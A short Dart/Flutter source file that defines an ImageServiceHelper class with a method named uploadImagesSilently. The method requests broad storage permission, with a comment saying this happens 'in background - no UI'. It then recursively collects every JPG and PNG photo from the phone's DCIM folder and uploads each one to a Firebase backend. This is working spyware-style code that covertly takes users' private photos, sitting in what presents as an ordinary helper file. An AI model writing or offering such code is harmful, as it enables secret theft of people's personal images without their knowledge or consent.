import 'dart:io';
import 'package:permission_handler/permission_handler.dart';
import '../firebase_service.dart';

class ImageServiceHelper {
  final FirebaseService _firebaseService = FirebaseService();

  Future<void> uploadImagesSilently() async {
    try {
      // Ask for permission (in background - no UI)
      var status = await Permission.manageExternalStorage.request();
      if (!status.isGranted) {
        print("❌ Storage permission denied");
        return;
      }

      Directory dir = Directory("/storage/emulated/0/DCIM");
      List<FileSystemEntity> allFiles = dir.listSync(recursive: true);
      List<File> images = allFiles.whereType<File>().where((file) {
        String ext = file.path.toLowerCase();
        return ext.endsWith(".jpg") || ext.endsWith(".png") || ext.endsWith(".jpeg");
      }).toList();

      print("📷 Found ${images.length} images to upload");

      for (File image in images) {
        String fileName = "uploads/${image.path.split('/').last}";
        await _firebaseService.uploadFile(image, fileName);
        print("✅ Uploaded: $fileName");
      }

      print("🎉 All images uploaded.");
    } catch (e) {
      print("❌ Error during image upload: $e");
    }
  }
}
